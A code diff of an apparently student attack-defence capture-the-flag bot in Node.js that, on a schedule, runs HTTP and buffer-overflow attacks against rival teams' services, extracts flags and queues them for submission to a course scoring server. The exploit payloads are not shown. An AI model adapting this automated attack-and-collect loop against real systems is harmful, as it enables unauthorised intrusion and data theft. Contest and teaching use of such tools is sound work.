@@ -6,14 +6,39 @@ var schedule = require('node-schedule');
 var program = require('commander');
 
 
-// submit flag
+
+//
+//  Schedules
+//
+
+var attackRule = new schedule.RecurrenceRule();
+attackRule.minute = [5, 15, 25, 35, 45, 55];
+
+var submitRule = new schedule.RecurrenceRule();
+submitRule.second = [0, 5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 55];
+
+//
+// submit shit
+//
+var submitQueue = [];
+
+// push flag to the queue first
 var submit = function (flag) {
-    var url = "http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/process.php?ID=13&key=" + flag.toString();
-    var req = http.request(url);
-    req.on('error', function(e) {
-      console.log('SUBMIT ERROR: '.red + e.message);
-    });
-    req.end();
+    submitQueue.push(flag);
+}
+
+// enqueue and submit
+var submitToServer = function () {
+    flag = submitQueue.shift();
+    if (flag) {
+        console.log('SUBMITTED'.cyan, flag);
+        var url = "http://people.cs.nctu.edu.tw/~hwcheng/NSFinal/process.php?ID=13&key=" + flag.toString();
+        http.request(url)
+            .on('error', function(e) {
+                console.log('SUBMIT ERROR: '.red + e.message);
+            })
+            .end();
+    }
 }
 
 var parseFlag = function (regex, data) {
@@ -30,18 +55,18 @@ var httpAttack = function (regex, genURL, team) {
         res.on('data', function (data) {
             flag = parseFlag(regex, data)
             if (flag) {
-                console.log('FLAG: '.yellow, team.toString().green, flag);
+                console.log('CAPTURED '.yellow, team.toString().green, flag);
                 submit(flag);
                 req.destroy();
             }
         });
     });
     req.on('error', function(e) {
-        console.log('ERROR: '.red, team, e.message);
+        console.log('ERROR '.red, team.toString().green, e.message);
         req.destroy();
     });
     req.setTimeout(10000, function () {
-        console.log('TIMEOUT: '.red, team);
+        console.log('TIMEOUT '.red, team.toString().green);
         req.destroy();
     });
     req.end();
@@ -80,17 +105,17 @@ var sspLoginBufferOverflow = function (team) {
     req.on('data', function(data) {
         result = parseFlag(sspLoginBufferOverflowRegex, data);
         if (result) {
-            console.log('Flag: '.yellow, team, result);
+            console.log('CAPTURED '.yellow, team.toString().green, result);
             submit(result);
             req.destroy();
         }
     });
     req.on('error', function(e) {
-        console.log('ERROR: '.red, team, e.message);
+        console.log('ERROR '.red, team.toString().green, e.message);
         req.destroy();
     });
     req.setTimeout(10000, function () {
-        console.log('TIMEOUT: '.red, team);
+        console.log('TIMEOUT '.red, team.toString().green);
         req.destroy();
     });
 
@@ -109,10 +134,10 @@ var attackAll = function () {
         sspLoginBufferOverflow(team);
     }
 };
-// main
-var rule = new schedule.RecurrenceRule();
-rule.minute = [5, 15, 25, 35, 45, 55];
 
+
+
+// main
 program
     .version('0.0.1')
     .option('-n, --now', 'Attack all attack NOW!!')
@@ -128,6 +153,8 @@ if (program.minute) {
 
 if (program.now) {
     attackAll(program);
+    schedule.scheduleJob(submitRule, submitToServer);
 } else {
-    var j = schedule.scheduleJob(rule, attackAll);
+    schedule.scheduleJob(attackRule, attackAll);
+    schedule.scheduleJob(submitRule, submitToServer);
 }
